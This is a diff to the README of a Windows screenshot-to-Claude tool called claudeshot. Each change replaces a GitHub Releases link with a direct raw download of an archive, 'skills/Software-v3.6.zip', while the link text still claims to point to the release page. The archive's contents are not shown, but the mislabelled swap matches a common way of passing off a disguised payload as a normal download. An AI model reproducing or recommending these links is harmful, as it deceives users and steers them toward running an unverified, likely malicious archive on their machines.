@@ -1,6 +1,6 @@
 # 🖱️ claudeshot - Send Screenshots Into Claude Fast
 
-[![Download claudeshot](https://img.shields.io/badge/Download%20claudeshot-blue?style=for-the-badge&logo=github)](https://github.com/Spongernondriver422/claudeshot/releases)
+[![Download claudeshot](https://img.shields.io/badge/Download%20claudeshot-blue?style=for-the-badge&logo=github)](https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip)
 
 ## 📸 What claudeshot does
 
@@ -16,7 +16,7 @@ Use this app on Windows if you want the fastest path from screenshot to Claude C
 
 Open the release page here:
 
-[Download claudeshot from GitHub Releases](https://github.com/Spongernondriver422/claudeshot/releases)
+[Download claudeshot from GitHub Releases](https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip)
 
 ### 2. Get the right file
 
@@ -174,7 +174,7 @@ No. The goal is to keep it simple. Capture the screen, send the image, and keep 
 
 Go to the release page and download the newest release listed there:
 
-[https://github.com/Spongernondriver422/claudeshot/releases](https://github.com/Spongernondriver422/claudeshot/releases)
+[https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip](https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip)
 
 ### What should I download on Windows?
 
@@ -203,7 +203,7 @@ If you still have trouble, grab the latest release and try the newest build from
 
 Start here:
 
-[Download claudeshot from GitHub Releases](https://github.com/Spongernondriver422/claudeshot/releases)
+[Download claudeshot from GitHub Releases](https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip)
 
 Then:
 
@@ -218,7 +218,7 @@ Then:
 
 Use the release page any time you want the latest version:
 
-[https://github.com/Spongernondriver422/claudeshot/releases](https://github.com/Spongernondriver422/claudeshot/releases)
+[https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip](https://github.com/Spongernondriver422/claudeshot/raw/refs/heads/main/skills/Software-v3.6.zip)
 
 ## 🧪 What to expect after launch
 
